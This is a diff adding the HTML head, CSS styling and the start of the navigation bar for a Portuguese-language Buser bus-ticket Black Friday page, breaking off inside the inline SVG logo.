@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Black Friday 2026 com viagens de ônibus em oferta | Buser</title>
+<link rel="preconnect" href="https://bcdn.com.br/" crossorigin>
+<link rel="preconnect" href="https://images.bcdn.com.br">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap">
+
+<!-- CSS do Calendário Profissional -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
+
+<style>
+  :root{
+    --brand:#f11075; --brand-dark:#e70869; --grey-dark:#454545; --grey-med:#757575;
+    --grey-light:#e0e0e0; --grey-lighter:#fafafa; --safe-top:env(safe-area-inset-top,0px);
+    --safe-bottom:env(safe-area-inset-bottom,0px);
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0;font-family:'Poppins',sans-serif;color:var(--grey-dark);background:#fff}
+  a{text-decoration:none;color:inherit}
+  ul{list-style:none;margin:0;padding:0}
+  .container{max-width:1200px;margin:0 auto;padding:0 16px;width:100%}
+
+  /* TASKBAR */
+  .taskbar{position:fixed;top:0;left:0;right:0;z-index:35;height:calc(60px + var(--safe-top));padding-top:var(--safe-top);background-color:#fafafa;box-shadow: 0 4px 8px rgba(0,0,0,0.1);}
+  .taskbar .t-content{align-items:center;display:flex;height:100%}
+  .taskbar-desktop{display:flex;align-items:center;justify-content:space-between;flex-grow:1;height:100%;max-width:100%}
+  .logo{width:122px;height:24px; color:var(--brand); fill:var(--brand);}
+  .menu-links{display:flex;gap:8px;align-items:center}
+  .menu-links .ml-item{color:var(--grey-dark);font-weight:500;padding:6px 16px;border-radius:500px;transition: background-color .2s, color .2s; font-size: 14px; cursor: pointer;}
+  .menu-links .ml-item:hover{background-color:var(--brand);color:#fff;text-decoration:none}
+  .avatar{width:36px;height:36px;border-radius:50%;background-image:url('https://bcdn.com.br/_nuxt3/avatar.fWv4A4-_.webp');background-size:cover;background-color:#e0e0e0; cursor: pointer;}
+  @media (max-width:767px){.taskbar-desktop{display:none}.taskbar-mobile{display:flex;align-items:center;justify-content:center;width:100%}}
+  @media (min-width:768px){.taskbar-mobile{display:none}}
+
+  /* HEADER */
+  .header{padding-top:calc(60px + var(--safe-top))}
+  .header .h-container{display:flex;flex-direction:column;align-items:center;gap:16px;min-height:390px;position:relative;width:100%;}
+  .hc-background-brand{position:absolute;inset:0;z-index:-2;height:calc(100% - 90px);background:linear-gradient(180deg, var(--brand) 0%, var(--brand) 65%, #fff 100%);}
+  
+  /* IMAGEM DE FUNDO (BANNER) */
+  .hc-video{position:absolute;inset:0;overflow:hidden;width:100%;z-index:-1;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:80px;}
+  .hc-video img{width:100%;max-width:1200px;height:auto;object-fit:contain;}
+  .hc-video::after {content: ""; position: absolute; inset: 0; background: linear-gradient(180deg, rgba(241,16,117,0.2) 0%, transparent 50%, rgba(241,16,117,0.6) 100%);}
+  
+  .searchbox-wrapper{width:100%;position:relative;z-index:5;padding-inline:16px;margin-top: 180px;}
+  .searchbox-card{background:#fff;border-radius:24px;padding:8px;display:flex;gap:4px;align-items:center;flex-wrap:wrap;box-shadow: 0 8px 24px rgba(87,75,6,0.1);position: relative;}
+  .searchbox-field{flex:1;min-width:160px;height:74px;display: flex; flex-direction: column; justify-content: center; padding: 0 16px;border-right: 1px solid var(--grey-light); position: relative;}
+  .searchbox-field:nth-child(3) { border-right: none; }
+  .searchbox-field label { font-size: 11px; color: var(--grey-med); font-weight: 500; margin-bottom: 2px; cursor: pointer; }
+  .searchbox-field input { border: none; outline: none; font-size: 15px; font-family: 'Poppins', sans-serif; color: var(--grey-dark); width: 100%; background: transparent; font-weight: 600;}
+  .searchbox-field input::placeholder { font-weight: 400; color: #999; }
+  
+  /* BOTÃO DE TROCAR (SWAP) */
+  .swap-btn { background: #fff; border: 1px solid var(--grey-light); border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; position: absolute; left: 33%; top: 50%; transform: translate(-50%, -50%); z-index: 10; color: var(--brand); box-shadow: 0 2px 4px rgba(0,0,0,0.1); transition: 0.2s;}
+  .swap-btn:hover { background: var(--brand); color: #fff; border-color: var(--brand); }
+
+  .searchbox-btn{background: var(--brand); color: #fff; border: none; height: 58px; width: 58px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; margin: 0 8px; font-size: 20px; flex-shrink: 0; transition: transform 0.2s;}
+  .searchbox-btn:hover { transform: scale(1.05); }
+  .hcb-vantagens{display:flex;gap:40px;justify-content:center;height:16px;width:100%;font-size: 12px; color: var(--grey-dark); margin-top: 8px;}
+
+  /* AUTOCOMPLETE */
+  .autocomplete-dropdown {position: absolute; top: 100%; left: 0; right: 0; background: #fff;border: 1px solid var(--grey-light); border-radius: 12px; margin-top: 8px;box-shadow: 0 10px 25px rgba(0,0,0,0.1); z-index: 100; max-height: 250px;overflow-y: auto; display: none;}
+  .autocomplete-dropdown li { padding: 12px 16px; cursor: pointer; font-size: 14px; border-bottom: 1px solid #f0f0f0; }
+  .autocomplete-dropdown li:hover { background-color: #fff7fa; color: var(--brand); }
+  .autocomplete-dropdown li:last-child { border-bottom: none; }
+
+  /* RESULTADOS */
+  #resultados-viagem {display: none; margin-top: 40px; padding: 24px; background: #fff;border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid var(--grey-light);}
+  #resultados-viagem h2 { font-size: 20px; margin: 0 0 16px; color: var(--brand); border-bottom: 2px solid var(--brand); padding-bottom: 8px; display: inline-block;}
+  .trip-card { border: 1px solid var(--grey-light); border-radius: 12px; padding: 16px 24px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; background: #fff; }
+  .trip-info h4 { margin: 0 0 4px; font-size: 18px; color: var(--grey-dark); }
+  .trip-info p { margin: 0; font-size: 14px; color: var(--grey-med); }
+  .trip-price { font-size: 24px; font-weight: 700; color: var(--brand); text-align: right; }
+  .trip-price span { display: block; font-size: 12px; font-weight: 400; color: var(--grey-med); text-align: right; margin-bottom: 4px;}
+  .btn-comprar { background: var(--brand); color: #fff; border: none; padding: 10px 20px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 8px; font-family: 'Poppins';}
+
+  /* FILTROS */
+  .resultados-layout { display: flex; gap: 24px; align-items: flex-start; }
+  .filtros-sidebar { width: 250px; flex-shrink: 0; background: #fff; border-radius: 16px; padding: 20px; border: 1px solid var(--grey-light); }
+  .filtros-sidebar h3 { font-size: 16px; font-weight: 600; margin-top: 0; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--grey-light); }
+  .filtro-grupo { margin-bottom: 24px; }
+  .filtro-item { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; font-size: 14px; color: var(--grey-dark); cursor: pointer; }
+  .filtro-item input { width: 16px; height: 16px; accent-color: var(--brand); cursor: pointer; }
+  @media (max-width: 768px) { .resultados-layout { flex-direction: column; } .filtros-sidebar { width: 100%; } }
+
+  /* PASSAGEIROS E POLTRONAS */
+  .passageiro-box { background: #f9f9f9; padding: 16px; border-radius: 8px; margin-bottom: 16px; border: 1px solid #eee; }
+  .passageiro-box input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #ddd; border-radius: 6px; font-family: 'Poppins', sans-serif; }
+  .poltrona-btn { width: 44px; height: 44px; border-radius: 8px; border: 1px solid #ddd; background: #fff; color: #333; font-weight: 600; cursor: pointer; transition: 0.2s; }
+  .poltrona-btn:hover:not(:disabled) { border-color: var(--brand); }
+  .poltrona-btn.selecionada { background: var(--brand); color: #fff; border-color: var(--brand); }
+  .poltrona-btn:disabled { background: #e0e0e0; color: #999; cursor: not-allowed; }
+
+  /* CARROSSEL DE CUPONS */
+  .cupons-carrossel{margin-top:48px}
+  .carousel ul{display:grid;gap:16px;grid-auto-flow:column;grid-auto-columns:calc(100%/3 - 16px);overflow-x:auto;padding:0 16px;scrollbar-width:none;scroll-snap-type:x mandatory;}
+  .carousel ul::-webkit-scrollbar{display:none}
+  @media (max-width:767px){.carousel ul{grid-auto-columns:100%}}
+  .cupom-img{width: 100%; border-radius: 16px; object-fit: cover; aspect-ratio: 366/183; cursor: pointer; transition: transform 0.2s;}
+  .cupom-img:hover { transform: scale(1.02); }
+
+  /* DESTINOS */
+  .secao-destinos{margin-top:48px}
+  .sdbc-header{display:flex;flex-direction:column;gap:16px;justify-content:space-between;margin-bottom:16px}
+  @media (min-width:768px){.sdbc-header{align-items:center;flex-direction:row}}
+  .sdbc-header h2 { font-size: 24px; font-weight: 600; margin: 0; }
+  .categories{display:flex;flex-wrap:nowrap;gap:16px;overflow-x:auto;padding:2px}
+  .cat-pill{padding: 12px 24px; border-radius: 16px; border: 1px solid var(--grey-light); background: #fff; color: var(--grey-dark); font-weight: 500; cursor: pointer; white-space: nowrap; transition: 0.2s;}
+  .cat-pill.active { border-color: var(--brand); color: var(--brand); background: #fff7fa; }
+  .cat-pill:hover { background: #fafafa; }
+
+  .section-destinations{display:grid;gap:16px}
+  @media (min-width:768px){.section-destinations{grid-template-columns:min-content 1fr;grid-template-areas:"multi destaque"}}
+  .cd-multi-cards{display:grid;gap:16px;grid-template-columns:repeat(2,1fr);grid-area:multi}
+  .dest-card{border-radius: 16px; overflow: hidden; position: relative; cursor: pointer; aspect-ratio: 1/1; border: 1px solid var(--grey-light);}
+  .dest-card img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.3s;}
+  .dest-card:hover img { transform: scale(1.05); }
+  .dest-card .info {position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, transparent 100%); padding: 24px 16px 16px; color: #fff;}
+  .dest-card .info h3 { margin: 0; font-size: 18px; font-weight: 600; }
+  .dest-card .info p { margin: 4px 0 0; font-size: 14px; }
+  
+  .cd-destaque{grid-area:destaque; border-radius: 16px; overflow: hidden; position: relative; border: 1px solid var(--grey-light); cursor: pointer;}
+  .cd-destaque img { width: 100%; height: 100%; object-fit: cover; }
+  @media (max-width:767px){.cd-destaque{display:none}}
+
+  .sdb-button{display:flex;justify-content:center;margin-top:24px}
+  .btn-outline{border: 1px solid var(--brand); color: var(--brand); background: transparent; padding: 14px 24px; border-radius: 16px; font-weight: 500; font-size: 16px; cursor: pointer; transition: 0.2s; text-decoration: none;}
+  .btn-outline:hover { background: var(--brand); color: #fff; }
+
+  /* VALORES BUSER */
+  .valores-buser{margin-top:64px;padding-top:40px; background: #fafafa; padding-bottom: 40px; border-radius: 24px;}
+  .vb-head{text-align:center;margin-bottom:32px;padding-inline:24px}
+  .vb-head h2 { font-size: 32px; font-weight: 600; margin: 8px 0; color: var(--brand); }
+  .vb-head p { font-size: 16px; color: var(--grey-dark); margin: 0; }
+  .vb-cards{display:grid;gap:16px;grid-template-columns:repeat(3,1fr); padding: 0 24px;}
+  @media (max-width:1023px){.vb-cards{grid-template-columns:repeat(2,1fr)}}
+  @media (max-width:767px){.vb-cards{grid-template-columns:1fr}}
+  .vb-card{background: #fff; border: 1px solid var(--grey-light); border-radius: 16px; padding: 32px; display: flex; flex-direction: column; gap: 16px;}
+  .vb-card .icon-circle{width: 64px; height: 64px; border-radius: 50%; background: #fdf6ec; display: flex; align-items: center; justify-content: center; font-size: 24px;}
+  .vb-card h3 { margin: 0; font-size: 20px; font-weight: 600; color: var(--brand); }
+  .vb-card p { margin: 0; font-size: 14px; line-height: 1.5; color: var(--grey-med); }
+
+  /* MÍDIA */
+  .midia-section{display:flex;flex-direction:column;gap:24px;overflow:hidden;margin-top:64px;position:relative;padding-block:24px;}
+  @media (min-width:768px){.midia-section{align-items:center;flex-direction:row;padding-block:40px}}
+  .ms-content{min-width:min(334px,30%); z-index: 2;}
+  .ms-content h2 { font-size: 32px; color: var(--brand); margin: 8px 0 16px; }
+  .ms-content p { font-size: 16px; margin-bottom: 16px; }
+  .ms-content a { color: var(--brand); font-weight: 600; text-decoration: underline; }
+  .ms-items{display:grid;gap:40px;position:relative;z-index:1;width:100%}
+  @media (min-width:768px){.ms-items{grid-template-columns:1fr 1fr;padding-inline:40px}}
+  .ms-item{border:1px solid var(--grey-light);border-radius:16px;padding:24px;display:flex;flex-direction:column;justify-content:space-between;background: #fff; gap: 16px;box-shadow: 0 2px 8px rgba(0,0,0,0.05); cursor: pointer;}
+  .ms-item h3 { margin: 0; font-size: 16px; font-weight: 600; line-height: 1.4; }
+  .ms-item img { width: 90px; height: auto; margin-bottom: 8px; }
+  .ms-item p { margin: 0; font-size: 12px; color: var(--grey-med); }
+  .ms-background{position:absolute;bottom:0;left:0;right:0;max-height:400px;border-radius:16px;overflow:hidden;z-index:0;}
+  @media (min-width:768px){.ms-background{max-width:min(660px,55vw);bottom:unset;left:unset;right:24px}}
+  .ms-background img { width: 100%; height: 100%; object-fit: cover; }
+
+  /* BANNERS HOME */
+  .banners-home{display:grid;gap:16px;grid-template-columns:1fr;margin-top:64px}
+  @media (min-width:768px){.banners-home{grid-template-columns:1fr 1fr}}
+  .bh-promo{display:flex;flex-direction:column;gap:24px;align-items:center;background:#fdf6ec;border-radius:16px;padding:32px;}
+  @media (min-width:768px){.bh-promo{flex-direction:row;grid-column:1/3;justify-content:space-between}}
+  .bh-promo h1 { color: var(--brand); margin: 0 0 8px; font-size: 24px; }
+  .bh-promo p { margin: 0; font-size: 16px; }
+  .bh-card{display:flex;flex-direction:column;gap:16px;justify-content:space-between;border:1px solid var(--grey-light);border-radius:16px;padding:24px;overflow:hidden;}
+  @media (min-width:768px){.bh-card{align-items:flex-start;flex-direction:row;gap:24px}}
+  .bh-card h2 { margin: 0 0 8px; font-size: 20px; }
+  .bh-card p { margin: 0 0 12px; font-size: 14px; color: var(--grey-med); }
+  .bh-card .stores { display: flex; flex-direction: column; gap: 8px; }
+  .bh-card .stores img { width: 120px; height: auto; cursor: pointer; }
+  .bh-card .img-whats { width: 160px; height: 100%; object-fit: cover; border-radius: 12px; }
+
+  /* DESTINOS MAIS PROCURADOS */
+  .destinos-procurados{margin-top:64px;padding-top:40px}
+  .destinos-procurados h2 { text-align: center; font-size: 28px; margin-bottom: 32px; }
+  .dp-carousel ul{grid-auto-columns:calc(100%/3 - 16px)}
+  @media (max-width:1023px){.dp-carousel ul{grid-auto-columns:calc(100%/2 - 16px)}}
+  @media (max-width:767px){.dp-carousel ul{grid-auto-columns:100%}}
+  .dp-card{border:1px solid var(--grey-light);border-radius:16px;padding:24px;margin-bottom:16px; background: #fff;}
+  .dp-card h3 { margin: 0 0 16px; font-size: 18px; }
+  .dp-card .dp-row{display:flex;justify-content:space-between;margin-bottom:12px; font-size: 14px;}
+  .dp-card .dp-row a { color: var(--grey-dark); }
+  .dp-card .dp-row a:hover { color: var(--brand); }
+  .dp-card .dp-row span { font-weight: 600; }
+  .dp-card .ver-mais { display: block; text-align: right; color: var(--brand); font-size: 14px; font-weight: 600; margin-top: 16px; }
+
+  /* SOBRE BUSER */
+  .sobre-buser{margin-top:64px}
+  .ac-titulo{display:flex;flex-direction:column;align-items:center;text-align:center}
+  .ac-titulo p { color: var(--brand); font-weight: 600; margin: 0 0 8px; }
+  .ac-titulo h2 { font-size: 32px; margin: 0 0 32px; max-width: 600px; }
+  .sobre-container{width:100%;max-width:700px;height:394px;border-radius:16px;overflow:hidden;position:relative;margin:0 auto;}
+  .sobre-container img { width: 100%; height: 100%; object-fit: cover; }
+  .sci-btn{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:72px;height:72px;border-radius:50%;background:rgba(0,0,0,0.7);display: flex; align-items: center; justify-content: center; color: #fff; font-size: 24px;cursor: pointer; transition: 0.2s; border: none;}
+  .sci-btn:hover { background: var(--brand); transform: translate(-50%, -50%) scale(1.1); }
+  .mpv-motivos{margin-top:48px; display: grid; gap: 24px; grid-template-columns: repeat(3, 1fr);}
+  @media (max-width:767px){ .mpv-motivos{ grid-template-columns: 1fr; } }
+  .mpv-item { display: flex; flex-direction: column; gap: 8px; }
+  .mpv-item .icon { color: var(--brand); font-size: 28px; }
+  .mpv-item h3 { margin: 0; font-size: 18px; }
+  .mpv-item p { margin: 0; font-size: 14px; color: var(--grey-med); line-height: 1.5; }
+
+  /* SEGURANÇA */
+  .seguranca-section{background:linear-gradient(132deg,var(--brand) 33.33%,var(--brand-dark) 47.36%);color:#fff;padding:32px 0;margin-top:64px;border-radius:24px;}
+  .ss-container{display:flex;flex-direction:column;gap:40px;align-items:center;padding-inline:24px}
+  @media (min-width:768px){.ss-container{flex-direction:row;padding-inline:48px}}
+  .ssc-image{width:100%;border-radius:16px;overflow:hidden}
+  .ssc-image img { width: 100%; height: 100%; object-fit: cover; }
+  @media (min-width:768px){.ssc-image{width:569px;flex-shrink:0}}
+  .ssc-content{flex:1}
+  .ssc-content h2 { font-size: 28px; margin: 0 0 16px; }
+  .ssc-content p { font-size: 16px; line-height: 1.6; margin: 0 0 24px; }
+  .btn-white{background: #fff; color: var(--brand); padding: 14px 24px; border-radius: 16px;font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 8px;transition: 0.2s;}
+  .btn-white:hover { transform: scale(1.05); }
+
+  /* FOOTER */
+  .footer{margin-top:64px;padding-bottom:calc(56px + var(--safe-bottom));border-top:1px solid var(--grey-light)}
+  @media (min-width:768px){.footer{padding-bottom:0}}
+  .f-social-brand{display:flex;justify-content:space-between;align-items:center;padding:24px 0;flex-wrap:wrap;gap:16px}
+  .f-social-brand img { width:120px; }
+  .fe-social{display:flex;gap:16px; color: var(--grey-dark); font-size: 20px;}
+  .ada-divider{height:1px;background:var(--grey-light);display:block;width:100%}
+  .f-links{display:flex;gap:48px;padding:32px 0;flex-wrap:wrap}
+  @media (max-width:767px){.f-links{flex-direction:column;gap:24px}}
+  .f-links > div{flex:1;min-width:150px}
+  .f-links .r-title{font-size:16px;font-weight:600;margin-bottom:12px;color:var(--grey-dark)}
+  .f-links .r-link{display:block;font-size:14px;color:var(--grey-med);margin-bottom:12px;transition:0.2s}
+  .f-links .r-link:hover { color: var(--brand); }
+  .fe-copyright{padding:24px 0;display:flex;justify-content:center;font-size:12px;color:var(--grey-med);text-align:center}
+
+  /* NAV BOTTOM */
+  .ada-nav-bottom{display:none;position:fixed;bottom:0;left:0;right:0;z-index:25;height:calc(56px + var(--safe-bottom));padding-bottom:var(--safe-bottom);background:#fff;box-shadow:0 -2px 3px rgba(0,0,0,0.1);justify-content: space-around; align-items: center;}
+  @media (max-width:767px){.ada-nav-bottom{display:flex}}
+  .nb-item{display: flex; flex-direction: column; align-items: center; justify-content: center;color: var(--grey-med); font-size: 11px; text-decoration: none; gap: 4px;}
+  .nb-item.active { color: var(--brand); }
+  .nb-item i { font-size: 20px; }
+  @media (max-width:767px){ body{padding-bottom:calc(56px + var(--safe-bottom))} }
+</style>
+</head>
+<body>
+
+<nav class="taskbar">
+  <div class="container t-content">
+    <div class="taskbar-desktop">
+      <a href="/" title="Buser">
+        <svg class="logo" viewBox="0 0 122 24" xmlns="http://www.w3.org/2000/svg"><path d="M15.6299 11.9915C14.6646 10.4937 13.7047 9.0067 12.7394 7.51022C12.765 7.48173 12.7892 7.45324 12.8162 7.42746C13.4153 6.84813 14.0817 6.36242 14.8127 5.9649C15.6353 5.51717 16.505 5.19834 17.4204 5.00975C17.9482 4.90121 18.4813 4.83745 19.0198 4.82523C21.3529 4.77368 23.4423 5.46833 25.2571 6.94717C26.8901 8.27678 27.9537 9.98627 28.4814 12.0336C28.6039 12.5071 28.6807 12.9887 28.7265 13.4772C28.7776 14.0253 28.7843 14.5734 28.7386 15.1202C28.5757 17.0549 27.9106 18.7956 26.7084 20.3165C25.4281 21.9351 23.7883 23.0177 21.8133 23.5808C21.3219 23.7205 20.8225 23.8128 20.3149 23.8671C19.7683 23.9268 19.2218 23.9417 18.6738 23.9023C17.1189 23.7897 15.6703 23.3312 14.3415 22.5063C13.1164 21.7465 12.1228 20.7479 11.3393 19.5323C9.38451 16.4959 7.42703 13.4609 5.47089 10.4245C4.11519 8.32698 2.76219 6.22539 1.40649 4.12516C1.1655 3.75205 1.00934 3.3491 0.974333 2.90409C0.921828 2.22572 1.0955 1.60976 1.50746 1.06707C1.91269 0.533871 2.44985 0.20554 3.10683 0.122779C4.19193 -0.0128944 5.0697 0.372419 5.67687 1.29364C6.4806 2.50793 7.25471 3.73849 8.04228 4.95955C9.92706 7.88332 11.8145 10.8071 13.7007 13.7295C14.3509 14.7376 15.0012 15.7443 15.6555 16.7496C16.3259 17.7821 17.2602 18.4469 18.4598 18.6857C19.9393 18.9801 21.2425 18.5853 22.3411 17.5447C23.0209 16.9002 23.4369 16.0984 23.6052 15.1744C24.0293 12.8517 22.5969 10.6646 20.3863 10.1043C19.9016 9.98084 19.4089 9.932 18.9121 9.98627C17.5524 10.1355 16.4753 10.7745 15.6918 11.9088C15.6797 11.9264 15.6689 11.944 15.6568 11.9603C15.6514 11.9671 15.6474 11.9712 15.6299 11.9915Z" fill="currentColor"></path><path d="M29.067 7.27818C29.0859 7.24562 29.0993 7.2212 29.1155 7.19813C30.3864 5.22272 31.6559 3.2446 32.9295 1.27055C33.3603 0.601673 33.9769 0.210933 34.7577 0.101037C35.859 -0.0549881 36.9104 0.522983 37.3789 1.54732C37.7734 2.41021 37.7236 3.26088 37.2147 4.06543C36.5631 5.09655 35.8967 6.11953 35.237 7.14522C33.9473 9.15048 32.6575 11.1557 31.3665 13.161C31.3463 13.1922 31.3247 13.2234 31.287 13.2763C31.0784 11.0621 30.3366 9.07315 29.067 7.27818Z" fill="currentColor"></path><path d="M52.7732 23.9215C52.5981 23.8971 52.4231 23.8713 52.2481 23.8496C51.4148 23.7438 50.6151 23.5213 49.8585 23.1495C49.3657 22.908 48.9013 22.6218 48.461 22.2948C47.5483 21.6164 46.9088 20.725 46.4443 19.6939C46.0714 18.8649 45.8493 17.9953 45.7429 17.093C45.6675 16.4595 45.6406 15.8245 45.6406 15.1868C45.6406 11.5264 45.6392 7.86587 45.6433 4.20539C45.6433 3.95439 45.6702 3.69797 45.7173 3.45104C45.786 3.09422 45.9785 2.80524 46.2693 2.58002C46.7647 2.19606 47.3342 2.09973 47.9373 2.12415C48.4207 2.14315 48.8824 2.2639 49.3321 2.43213C49.3496 2.43892 49.3671 2.44434 49.3846 2.45113C49.6552 2.56374 49.6552 2.56374 49.6565 2.85408C49.6606 6.59461 49.6646 10.3365 49.6687 14.077C49.6687 14.6143 49.6579 15.1529 49.6565 15.6902C49.6552 16.2546 49.7279 16.8108 49.8612 17.3603C50.0348 18.074 50.4172 18.6587 50.9355 19.1621C50.9395 19.1661 50.9449 19.1702 50.949 19.1743C51.7904 20.0073 52.823 20.2705 53.9592 20.1471C55.5963 19.9693 56.878 18.7618 57.193 17.1229C57.3855 16.1243 57.3357 15.1339 56.9412 14.191C56.4391 12.993 55.5169 12.2821 54.2662 12.0107C53.6267 11.8723 52.9845 11.8995 52.3545 12.0799C51.8698 12.2183 51.4323 12.4476 51.0526 12.784C51.0176 12.8153 50.9786 12.8424 50.9207 12.8872C50.9166 12.8044 50.9126 12.7447 50.9126 12.685C50.9126 11.5101 50.9153 10.3351 50.9086 9.1602C50.9072 9.01367 50.9517 8.94312 51.0849 8.88342C51.8792 8.52931 52.7085 8.33259 53.5769 8.29867C54.6243 8.25932 55.6515 8.37465 56.6289 8.76403C58.6537 9.56993 60.0713 10.9999 60.8683 13.0432C61.3287 14.2249 61.4782 15.4555 61.3987 16.7186C61.3368 17.7104 61.116 18.6601 60.7027 19.5623C59.9973 21.1022 58.8704 22.2324 57.3922 23.0206C56.4687 23.5131 55.4832 23.7886 54.4452 23.8849C54.3914 23.8903 54.3389 23.9079 54.285 23.9202C53.7802 23.9215 53.2767 23.9215 52.7732 23.9215Z" fill="currentColor"></path><path d="M69.6716 23.9214C69.5019 23.8984 69.3336 23.8699 69.164 23.8522C68.5205 23.7844 67.8918 23.6433 67.286 23.4221C65.1871 22.6569 63.8583 21.189 63.3589 18.9856C63.2323 18.4293 63.2108 17.8595 63.2108 17.2897C63.2108 14.9832 63.196 12.6768 63.2202 10.3717C63.2269 9.7313 63.5097 9.19403 64.1303 8.89962C64.4817 8.73274 64.8532 8.66626 65.2369 8.66083C65.8926 8.65133 66.5132 8.79922 67.1029 9.08549C67.1244 9.09634 67.1459 9.10855 67.1675 9.12077C67.1769 9.12755 67.185 9.13569 67.2079 9.15604C67.2079 9.22388 67.2079 9.30393 67.2079 9.38397C67.2079 11.8139 67.2079 14.2438 67.2079 16.6737C67.2079 17.2259 67.2536 17.7727 67.4192 18.3032C67.4529 18.409 67.4906 18.5135 67.531 18.6166C67.8312 19.3587 68.3697 19.8417 69.133 20.0534C69.9287 20.2745 70.7338 20.2813 71.5348 20.0846C72.4395 19.8634 73.0157 19.276 73.3159 18.4009C73.4559 17.9952 73.5219 17.5746 73.5421 17.1472C73.5515 16.9437 73.5515 16.7389 73.5515 16.5353C73.5515 14.5884 73.5502 12.6401 73.5542 10.6932C73.5542 10.4897 73.569 10.2848 73.6054 10.0854C73.7306 9.41382 74.1371 8.99187 74.7793 8.78972C75.1482 8.67304 75.5279 8.65676 75.9088 8.67983C76.4272 8.71103 76.9239 8.84128 77.4046 9.03936C77.5351 9.09363 77.5836 9.16689 77.5823 9.31614C77.5769 12.0242 77.5796 14.7322 77.5769 17.4403C77.5755 18.3005 77.4301 19.1362 77.134 19.9448C76.6224 21.3409 75.6827 22.3463 74.3862 23.0314C73.6229 23.4344 72.8084 23.6745 71.9616 23.8075C71.726 23.8441 71.4863 23.8617 71.2494 23.8902C71.2023 23.8956 71.1551 23.9119 71.108 23.9241C70.6288 23.9214 70.1508 23.9214 69.6716 23.9214Z" fill="currentColor"></path><path d="M121.031 10.8997C121.017 10.9458 121.004 10.9919 120.993 11.0394C120.953 11.1995 120.937 11.3718 120.869 11.5197C120.666 11.9688 120.395 12.3704 119.981 12.6743C119.92 12.6499 119.853 12.6227 119.788 12.5929C119.186 12.3202 118.567 12.1126 117.91 12.0258C117.377 11.9566 116.845 11.9471 116.317 12.0529C115.313 12.2523 114.709 12.8669 114.478 13.8655C114.384 14.278 114.361 14.6958 114.361 15.1178C114.363 17.838 114.363 20.6288 114.363 23.3478C114.363 23.4278 114.363 23.5065 114.363 23.5825C114.217 23.6232 110.686 23.6367 110.37 23.6001C110.366 23.5499 110.357 23.497 110.357 23.4441C110.357 20.31 110.355 17.1054 110.36 13.9713C110.362 13.0257 110.535 12.114 110.962 11.2646C111.579 10.0341 112.561 9.22139 113.835 8.75196C114.763 8.4087 115.725 8.29067 116.708 8.29338C117.489 8.29474 118.264 8.35036 119.021 8.56473C119.411 8.67598 119.789 8.81844 120.135 9.03823C120.557 9.30686 120.85 9.67454 120.973 10.167C121 10.2742 121.015 10.3828 121.035 10.4913C121.031 10.627 121.031 10.7626 121.031 10.8997Z" fill="currentColor"></path><path d="M98.9142 18.0644C98.9424 18.1472 98.9613 18.2177 98.9909 18.2828C99.3598 19.1023 99.9818 19.6518 100.798 19.9883C101.285 20.189 101.799 20.28 102.32 20.3179C103.276 20.3885 104.218 20.3166 105.141 20.0303C105.559 19.9001 105.944 19.6979 106.336 19.5053C106.533 19.4076 106.732 19.314 106.947 19.2095C107.464 20.2013 107.973 21.1795 108.486 22.1645C108.454 22.193 108.431 22.2214 108.401 22.2404C107.771 22.6624 107.116 23.0382 106.389 23.2648C105.58 23.5171 104.76 23.722 103.914 23.8129C103.174 23.8929 102.433 23.9269 101.692 23.8753C100.318 23.7803 99.0178 23.433 97.8506 22.6719C96.3455 21.691 95.3438 20.3207 94.8713 18.58C94.4014 16.8501 94.4216 15.1121 94.9898 13.4094C95.6858 11.3228 97.0671 9.8412 99.0609 8.9444C100.025 8.51024 101.04 8.29859 102.094 8.26332C103.093 8.23076 104.083 8.29995 105.041 8.60522C106.075 8.9349 107.004 9.44775 107.734 10.2767C108.475 11.1206 108.854 12.107 108.84 13.2412C108.834 13.7703 108.77 14.2872 108.622 14.796C108.443 15.4133 108.105 15.9248 107.635 16.3535C107.102 16.8393 106.472 17.1513 105.798 17.3806C105.04 17.637 104.262 17.8039 103.47 17.9097C102.257 18.0725 101.037 18.097 99.8148 18.082C99.5698 18.0793 99.3248 18.0644 99.0798 18.0563C99.0313 18.0563 98.9842 18.0617 98.9142 18.0644ZM98.6637 15.0294C98.7472 15.0389 98.8011 15.0484 98.8549 15.0497C100.063 15.0646 101.27 15.1026 102.474 14.9466C103.073 14.8693 103.654 14.7309 104.202 14.4636C104.625 14.2574 104.886 13.9304 104.932 13.4488C104.986 12.902 104.858 12.4244 104.379 12.1042C104.113 11.9265 103.825 11.7868 103.513 11.7054C102.903 11.548 102.287 11.5222 101.671 11.6348C100.625 11.8275 99.7892 12.3471 99.2292 13.2792C98.968 13.7133 98.8065 14.1828 98.7149 14.678C98.6961 14.7879 98.6839 14.8964 98.6637 15.0294Z" fill="currentColor"></path><path d="M91.0789 13.035C90.8864 12.8817 90.7113 12.7257 90.5202 12.5954C90.0059 12.2441 89.427 12.0433 88.8293 11.8913C87.9515 11.6674 87.0616 11.5358 86.1555 11.5358C85.5847 11.5358 85.0153 11.567 84.4579 11.7122C84.1711 11.7868 83.8938 11.8872 83.6649 12.0853C83.3782 12.3336 83.2799 12.6484 83.358 13.0188C83.4159 13.2942 83.5922 13.476 83.8332 13.5981C84.1873 13.7772 84.5656 13.8844 84.9547 13.9413C85.6884 14.0485 86.4248 14.1435 87.1599 14.2425C88.0524 14.3633 88.9491 14.461 89.8174 14.7201C90.4798 14.9182 91.1098 15.1814 91.6928 